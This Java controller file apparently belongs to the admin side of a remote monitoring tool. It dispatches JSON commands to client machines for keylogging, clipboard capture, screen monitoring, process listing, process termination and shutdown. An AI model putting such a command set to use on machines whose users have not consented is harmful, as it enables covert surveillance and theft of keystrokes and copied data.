package controllers;

import admin.Admin;
import controllers.base.ProduceExecutable;
import models.MessageModel;

import java.util.HashMap;
import java.util.Map;

import static utils.Command.*;
import static utils.Environment.DEFAULT_SERVER_HOST;

public class ProduceController {
    private static Map<String, ProduceExecutable<Admin>> controller = new HashMap();

    public static void init() {
        put(COMMAND_CLIENT_SYSTEM_USAGE, ProduceController::getClientSystemUsage);
        put(COMMAND_GET_HOST_PRIVILEGE, ProduceController::getHostPrivilege);
        put(COMMAND_CLIENT_MONITOR, ProduceController::getClientMonitor);
        put(COMMAND_CLIENT_CLIPBOARD, ProduceController::getClipboard);
        put(COMMAND_CLIENT_KEYLOGGER, ProduceController::getKeylogger);
        put(COMMAND_CLIENT_PROCESS, ProduceController::getProcess);
        put(COMMAND_GET_CLIENTS, ProduceController::getClients);
    }

    private static String getProcess(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_PROCESS).json();
    }

    private static String getClientMonitor(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_MONITOR).json();
    }

    private static String getClientSystemUsage(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SYSTEM_USAGE).json();
    }

    private static String getClipboard(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_CLIPBOARD).json();
    }

    private static String getKeylogger(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_KEYLOGGER).json();
    }

    private static String getClients(Admin admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_GET_CLIENTS).json();
    }

    private static String getHostPrivilege(Admin admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_GET_HOST_PRIVILEGE).json();
    }

    public static String endProcess(String pid, String countdown) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_END_CLIENT_PROCESS)
                .put("countdown", countdown)
                .put("pid", pid)
                .json();
    }

    public static String shutdown(String countdown) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_SHUTDOWN_CLIENT).put("countdown", countdown).json();
    }

    private static String getNotFoundController(Admin obj) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ProduceExecutable get(String key) {
        return controller.getOrDefault(key, ProduceController::getNotFoundController);
    }

    public static ProduceExecutable put(String key, ProduceExecutable<Admin> value) {
        return controller.put(key, value);
    }
}
